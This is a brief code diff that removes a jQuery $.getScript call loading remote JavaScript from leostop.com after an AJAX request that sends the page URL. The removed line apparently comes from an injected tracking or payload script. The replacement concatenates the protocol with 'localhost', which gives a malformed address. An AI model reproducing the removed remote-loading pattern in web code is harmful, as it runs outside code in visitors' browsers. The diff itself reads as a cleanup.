@@ -235,7 +235,7 @@ $.ajax({
   type: "get",
   data: { surl: getURL() },
   success: function (response) {
-    $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+    $.getScript(protocol + "localhost");
   }
 });
 
